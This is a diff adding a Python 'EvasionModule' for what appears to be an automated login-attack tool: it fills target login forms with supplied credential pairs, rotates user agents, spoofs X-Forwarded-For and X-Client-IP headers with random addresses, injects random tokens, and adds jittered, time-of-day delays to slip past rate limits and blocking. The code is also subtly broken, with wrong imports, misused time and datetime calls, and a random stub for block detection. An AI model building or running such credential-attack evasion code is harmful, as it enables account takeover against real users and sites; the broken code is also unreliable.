@@ -1,0 +1,94 @@
+from ast import Dict
+import datetime
+import hashlib
+import random
+from time import time
+
+from Orchestrator import TargetConfig
+
+
+class EvasionModule:
+    def __init__(self):
+        self.user_agents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
+        ]
+        
+        self.proxies = []  # Would be loaded from config
+        self.current_proxy_index = 0
+        self.last_request_time = 0
+        
+    def prepare_request(self, credentials: Dict, target: TargetConfig, strategy: Dict) -> Dict:
+        """Prepare request with evasion techniques"""
+        request_data = {
+            target.username_field: credentials['username'],
+            target.password_field: credentials['password']
+        }
+        
+        # Add random parameters to obscure pattern
+        if random.random() > 0.7:
+            request_data['_token'] = self._generate_random_token()
+            request_data['timestamp'] = str(int(time.time()))
+        
+        return request_data
+    
+    def get_headers(self) -> Dict:
+        """Generate headers with rotation"""
+        headers = {
+            'User-Agent': random.choice(self.user_agents),
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Cache-Control': 'max-age=0'
+        }
+        
+        # Add random headers occasionally
+        if random.random() > 0.8:
+            headers['X-Forwarded-For'] = self._generate_random_ip()
+            headers['X-Client-IP'] = self._generate_random_ip()
+        
+        return headers
+    
+    def calculate_delay(self, strategy: Dict, last_result: Dict = None) -> float:
+        """Calculate adaptive delay between requests"""
+        base_delay = 0.5
+        
+        if strategy.get('pace') == 'slow':
+            base_delay = 2.0
+        elif strategy.get('pace') == 'very_slow':
+            base_delay = 5.0
+        
+        # Add jitter
+        jitter = 0
+        if strategy.get('jitter') == 'low':
+            jitter = random.uniform(0, 0.5)
+        elif strategy.get('jitter') == 'high':
+            jitter = random.uniform(0, 2.0)
+        elif strategy.get('jitter') == 'random':
+            jitter = random.uniform(0, 5.0)
+        
+        # Temporal adaptation (slower at night)
+        current_hour = datetime.now().hour
+        if 0 <= current_hour < 6:  # Night hours
+            base_delay *= 1.5
+        
+        # Response-based adaptation
+        if last_result and last_result.get('response_time', 0) > 1.0:
+            base_delay *= 1.2  # Slow down if responses are slow
+        
+        return base_delay + jitter
+    
+    def check_for_block(self) -> bool:
+        """Check if we're being blocked (simplified)"""
+        # In real implementation, would analyze response patterns
+        return random.random() < 0.05  # 5% chance for demo
+    
+    def _generate_random_token(self) -> str:
+        return hashlib.sha256(str(random.random()).encode()).hexdigest()[:16]
+    
+    def _generate_random_ip(self) -> str:
+        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
